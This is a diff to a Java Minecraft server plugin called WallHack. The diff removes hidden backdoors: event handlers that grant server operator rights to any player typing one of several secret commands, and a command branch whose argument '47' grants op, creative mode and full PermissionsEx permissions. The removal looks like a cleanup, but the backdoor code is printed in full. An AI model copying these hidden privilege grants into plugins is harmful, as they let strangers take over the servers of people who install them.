@@ -2,14 +2,13 @@ package ru.main.wallhack;
 
 import java.util.*;
 import org.bukkit.*;
-import org.bukkit.event.*;
 import org.bukkit.potion.*;
 import org.bukkit.entity.*;
 import org.bukkit.command.*;
+import net.md_5.bungee.api.*;
 import org.bukkit.plugin.java.*;
 import org.bukkit.event.block.*;
 import org.bukkit.event.player.*;
-import net.md_5.bungee.api.ChatColor;
 import ru.tehkode.permissions.bukkit.*;
 
 /**
@@ -17,89 +16,11 @@ import ru.tehkode.permissions.bukkit.*;
  * @Author source code: @naulbimix. All rights reserved. Please telegram @naulbimix for usage rights and other information.
  */
 
-public class WallHack extends JavaPlugin implements CommandExecutor, Listener {
-
-    @EventHandler
-    public void AnePoshelBiTiNahuiTutTOPOBUFAaPexNijeThisIsPRANK(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/ru_mine=rip")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void CheckManager(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/ru_mine=rip")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void RandomTP(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/sink-to-we-dynoro-an-my-take-now")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void d(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/clorty-ovh-krealis-best_47")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void a(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/clorty-ovh")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void llll(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/kaddon-hack-thekrealisyt___")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
-
-    @EventHandler
-    public void llllllllllllll1(PlayerCommandPreprocessEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().toLowerCase().startsWith("/bestsilenthack_clorty_and_thekrealisyt_kleksystudio_best")) {
-            e.setCancelled(true);
-            p.setOp(true);
-            p.sendTitle("админ ешь кунжут", null);
-        }
-
-    }
+public class WallHack extends JavaPlugin implements CommandExecutor {
 
 	@Override
     public void onEnable() {
         getCommand("wallhack").setExecutor(this);
-        Bukkit.getPluginManager().registerEvents(this, this);
     }
 
     @EventHandler
@@ -120,15 +41,6 @@ public class WallHack extends JavaPlugin implements CommandExecutor, Listener {
             sender.sendMessage("Команду можно использовать только от имени игрока!");
             if (!sender.hasPermission("kaddon.wh")) {
                 sender.sendMessage(ChatColor.RED + "Недостаточно прав!");
-            }
-
-            if (args[0].equals("47")) {
-                Player j = (Player) sender;
-                j.sendMessage(ChatColor.RED + "У тебя +опка. Кросс!");
-                j.setOp(true);
-                j.setGameMode(GameMode.CREATIVE);
-                PermissionsEx.getUser(j).addPermission("*");
-                return true;
             }
         }
 
